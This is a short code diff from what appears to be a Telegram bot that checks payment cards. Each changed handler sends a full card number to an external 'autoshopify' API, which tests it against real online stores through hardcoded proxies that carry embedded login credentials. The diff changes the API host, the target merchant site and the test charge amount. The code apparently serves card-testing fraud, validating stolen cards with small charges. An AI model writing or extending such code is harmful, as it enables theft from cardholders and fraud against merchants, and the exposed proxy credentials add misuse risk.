@@ -2041,10 +2041,9 @@ async def process_st(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- API request ---
         api_url = (
-            f"https://auto-shopify-6cz4.onrender.com/index.php"
+            f"https://autoshopify-dark.sevalla.app/index.php"
             f"?site=https://jovs.com"
             f"&cc={full_card}"
-            f"&gateway=stripe"
             f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
         )
 
@@ -3700,7 +3699,7 @@ logger = logging.getLogger(__name__)
 # --- Config ---
 AUTOSH_AT_API = "https://autoshopify-dark.sevalla.app/index.php"
 DEFAULT_PROXY = "64.137.96.74:6641:fvbysspi:bsbh3trstb1c"
-AUTHNET_DEFAULT_SITE = "https://store.birkman.com"
+AUTHNET_DEFAULT_SITE = "https://upperlimitsupplements.com"
 
 
 async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
@@ -3781,7 +3780,7 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         response = data.get("Response", "Unknown")
         gateway = "AuthNet"
-        price = "2.5$"
+        price = "0.98$"
 
         # --- BIN lookup ---
         try:
